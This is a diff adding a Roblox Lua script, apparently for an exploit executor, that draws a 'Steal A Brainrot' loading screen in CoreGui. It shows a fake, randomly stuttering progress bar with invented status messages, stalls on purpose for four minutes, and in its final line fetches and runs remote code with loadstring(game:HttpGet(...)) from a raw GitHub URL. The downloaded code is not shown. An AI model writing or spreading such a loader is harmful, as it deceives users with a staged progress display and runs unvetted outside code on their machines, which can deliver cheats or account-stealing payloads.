@@ -1,0 +1,265 @@
+if game.CoreGui:FindFirstChild("LoadingScreen") then
+	game.CoreGui.LoadingScreen:Destroy()
+end
+
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Name = "LoadingScreen"
+LoadingGui.IgnoreGuiInset = false
+LoadingGui.ResetOnSpawn = false
+LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LoadingGui.Parent = CoreGui
+
+-- =====================================================
+-- MAIN FRAME
+-- =====================================================
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 300, 0, 140)
+LoadingFrame.Position = UDim2.new(0.5, -150, 0.5, -70)
+LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.ZIndex = 200
+LoadingFrame.Active = true
+LoadingFrame.Parent = LoadingGui
+
+Instance.new("UICorner", LoadingFrame).CornerRadius = UDim.new(0, 12)
+
+local LoadingStroke = Instance.new("UIStroke")
+LoadingStroke.Thickness = 1.5
+LoadingStroke.Color = Color3.fromRGB(100, 80, 200)
+LoadingStroke.Parent = LoadingFrame
+
+-- Accent line at top
+local AccentLine = Instance.new("Frame")
+AccentLine.Size = UDim2.new(1, -24, 0, 2)
+AccentLine.Position = UDim2.new(0, 12, 0, 0)
+AccentLine.BackgroundColor3 = Color3.fromRGB(110, 70, 220)
+AccentLine.BorderSizePixel = 0
+AccentLine.ZIndex = 202
+AccentLine.Parent = LoadingFrame
+
+Instance.new("UICorner", AccentLine).CornerRadius = UDim.new(1, 0)
+
+-- =====================================================
+-- TITLE
+-- =====================================================
+local LoadingTitle = Instance.new("TextLabel")
+LoadingTitle.Size = UDim2.new(1, -24, 0, 30)
+LoadingTitle.Position = UDim2.new(0, 14, 0, 10)
+LoadingTitle.BackgroundTransparency = 1
+LoadingTitle.Text = "Steal A Brainrot"
+LoadingTitle.Font = Enum.Font.GothamBold
+LoadingTitle.TextSize = 18
+LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingTitle.TextXAlignment = Enum.TextXAlignment.Left
+LoadingTitle.ZIndex = 202
+LoadingTitle.Parent = LoadingFrame
+
+local SubLabel = Instance.new("TextLabel")
+SubLabel.Size = UDim2.new(1, -24, 0, 16)
+SubLabel.Position = UDim2.new(0, 14, 0, 36)
+SubLabel.BackgroundTransparency = 1
+SubLabel.Text = "Loading script..."
+SubLabel.Font = Enum.Font.Gotham
+SubLabel.TextSize = 11
+SubLabel.TextColor3 = Color3.fromRGB(180, 160, 255)
+SubLabel.TextXAlignment = Enum.TextXAlignment.Left
+SubLabel.ZIndex = 202
+SubLabel.Parent = LoadingFrame
+
+-- =====================================================
+-- PROGRESS BAR
+-- =====================================================
+local ProgressBg = Instance.new("Frame")
+ProgressBg.Size = UDim2.new(1, -28, 0, 8)
+ProgressBg.Position = UDim2.new(0, 14, 0, 66)
+ProgressBg.BackgroundColor3 = Color3.fromRGB(38, 34, 56)
+ProgressBg.BorderSizePixel = 0
+ProgressBg.ZIndex = 201
+ProgressBg.Parent = LoadingFrame
+
+Instance.new("UICorner", ProgressBg).CornerRadius = UDim.new(1, 0)
+
+local ProgressFill = Instance.new("Frame")
+ProgressFill.Size = UDim2.new(0, 0, 1, 0)
+ProgressFill.BackgroundColor3 = Color3.fromRGB(100, 60, 210)
+ProgressFill.BorderSizePixel = 0
+ProgressFill.ZIndex = 202
+ProgressFill.Parent = ProgressBg
+
+Instance.new("UICorner", ProgressFill).CornerRadius = UDim.new(1, 0)
+
+-- =====================================================
+-- PERCENT + STATUS ROW
+-- =====================================================
+local PercentText = Instance.new("TextLabel")
+PercentText.Size = UDim2.new(0, 50, 0, 22)
+PercentText.Position = UDim2.new(1, -64, 0, 84)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "0%"
+PercentText.Font = Enum.Font.GothamBold
+PercentText.TextSize = 13
+PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentText.TextXAlignment = Enum.TextXAlignment.Right
+PercentText.ZIndex = 201
+PercentText.Parent = LoadingFrame
+
+local StatusText = Instance.new("TextLabel")
+StatusText.Size = UDim2.new(1, -80, 0, 22)
+StatusText.Position = UDim2.new(0, 14, 0, 84)
+StatusText.BackgroundTransparency = 1
+StatusText.Text = "Initializing"
+StatusText.Font = Enum.Font.Gotham
+StatusText.TextSize = 11
+StatusText.TextColor3 = Color3.fromRGB(160, 145, 210)
+StatusText.TextXAlignment = Enum.TextXAlignment.Left
+StatusText.ZIndex = 201
+StatusText.Parent = LoadingFrame
+
+-- Version tag
+local VersionText = Instance.new("TextLabel")
+VersionText.Size = UDim2.new(1, -24, 0, 16)
+VersionText.Position = UDim2.new(0, 14, 1, -20)
+VersionText.BackgroundTransparency = 1
+VersionText.Text = "v1.0"
+VersionText.Font = Enum.Font.Gotham
+VersionText.TextSize = 9
+VersionText.TextColor3 = Color3.fromRGB(100, 90, 140)
+VersionText.TextXAlignment = Enum.TextXAlignment.Left
+VersionText.ZIndex = 201
+VersionText.Parent = LoadingFrame
+
+-- =====================================================
+-- DRAG SYSTEM
+-- =====================================================
+local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
+
+LoadingFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or
+	   input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = LoadingFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+LoadingFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or
+	   input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and input == dragInput then
+		local delta = input.Position - dragStart
+		LoadingFrame.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- =====================================================
+-- ANIMATED DOTS
+-- =====================================================
+local statusMessages = {
+	"Initializing",
+	"Loading modules",
+	"Connecting",
+	"Fetching data",
+	"Almost ready",
+}
+
+spawn(function()
+	local i = 1
+	local dot = 0
+	while LoadingGui.Parent do
+		dot = (dot + 1) % 4
+		StatusText.Text = statusMessages[i] .. string.rep(".", dot)
+		if dot == 0 then
+			i = math.min(i + 1, #statusMessages)
+		end
+		task.wait(0.45)
+	end
+end)
+
+-- =====================================================
+-- PROGRESS ANIMATION + LAUNCH
+-- =====================================================
+spawn(function()
+	local currentProgress = 0
+	local startTime = tick()
+	local totalDuration = 240
+
+	while currentProgress < 1 do
+		-- Stutter: randomly decide how much to advance
+		local chunk = math.random(1, 5) / 100
+		currentProgress = math.min(currentProgress + chunk, 0.99)
+
+		-- Clamp to time-based ceiling so it cant finish too early
+		local elapsed = tick() - startTime
+		local timeCap = elapsed / totalDuration
+		if currentProgress > timeCap + 0.05 then
+			currentProgress = timeCap + 0.05
+		end
+
+		ProgressFill.Size = UDim2.new(currentProgress, 0, 1, 0)
+		PercentText.Text = math.floor(currentProgress * 100) .. "%"
+
+		-- Random stutter delays
+		local roll = math.random(1, 10)
+		if roll <= 3 then
+			task.wait(math.random(100, 350) / 100)
+		elseif roll <= 6 then
+			task.wait(math.random(30, 90) / 100)
+		else
+			task.wait(math.random(5, 25) / 100)
+		end
+	end
+
+	-- Wait for real 4 min to expire before finishing
+	local remaining = totalDuration - (tick() - startTime)
+	if remaining > 0 then
+		task.wait(remaining)
+	end
+
+	ProgressFill.Size = UDim2.new(1, 0, 1, 0)
+	PercentText.Text = "100%"
+	StatusText.Text = "Done!"
+	StatusText.TextColor3 = Color3.fromRGB(100, 220, 140)
+
+	task.wait(0.5)
+
+	-- Fade out
+	local fadeTargets = {
+		{LoadingFrame, {BackgroundTransparency = 1}},
+		{LoadingStroke, {Transparency = 1}},
+		{AccentLine, {BackgroundTransparency = 1}},
+		{LoadingTitle, {TextTransparency = 1}},
+		{SubLabel, {TextTransparency = 1}},
+		{StatusText, {TextTransparency = 1}},
+		{PercentText, {TextTransparency = 1}},
+		{ProgressBg, {BackgroundTransparency = 1}},
+		{ProgressFill, {BackgroundTransparency = 1}},
+		{VersionText, {TextTransparency = 1}},
+	}
+
+	for _, t in ipairs(fadeTargets) do
+		TweenService:Create(t[1], TweenInfo.new(0.5), t[2]):Play()
+	end
+
+	task.wait(0.6)
+	LoadingGui:Destroy()
+
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/tiktok/refs/heads/main/ft"))()
+end)
